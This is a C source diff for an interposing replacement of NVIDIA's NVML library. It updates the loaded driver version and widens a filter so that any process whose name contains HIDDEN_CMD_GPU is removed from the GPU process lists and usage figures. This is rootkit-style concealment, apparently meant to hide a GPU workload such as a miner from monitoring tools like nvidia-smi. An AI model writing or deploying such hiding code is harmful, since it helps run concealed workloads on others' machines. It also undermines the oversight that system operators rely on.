@@ -10,7 +10,7 @@ void * dlhandler;
 void __attribute__ ((constructor)) some_name_load(void)
 {
 	//dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.346.46",RTLD_LAZY);
-	dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.346.46",RTLD_NOW);
+	dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.375.66",RTLD_NOW);
 	
 	//dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.352.39",RTLD_NOW);
 	if(dlhandler ==NULL)
@@ -151,7 +151,7 @@ nvmlReturn_t DECLDIR nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *
         {
                 char proname[128];
                 nvmlSystemGetProcessName(infos[i].pid, proname, 128);
-                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+                if(!strstr(proname, HIDDEN_CMD_GPU))
                 {
                         only_hidden = 0;
                         break;
@@ -187,7 +187,7 @@ nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *
 	{
                 char proname[128];
                 nvmlSystemGetProcessName(infos[i].pid, proname, 128);
-                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+                if(!strstr(proname, HIDDEN_CMD_GPU))
 		{
 			only_hidden = 0; 
 			break;
@@ -230,7 +230,7 @@ nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtil
 	{
                 char proname[128];
                 nvmlSystemGetProcessName(infos[i].pid, proname, 128);
-                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+                if(!strstr(proname, HIDDEN_CMD_GPU))
 		{
 			only_hidden = 0; 
 			break;
@@ -264,7 +264,7 @@ nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, u
 	{
 		char proname[128];
 		nvmlSystemGetProcessName(infos[i].pid, proname, 128);
-		if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+		if(!strstr(proname, HIDDEN_CMD_GPU))
 		{
 			new_infos[new_infoCount].pid = infos[i].pid;
 			new_infos[new_infoCount].usedGpuMemory = infos[i].usedGpuMemory;
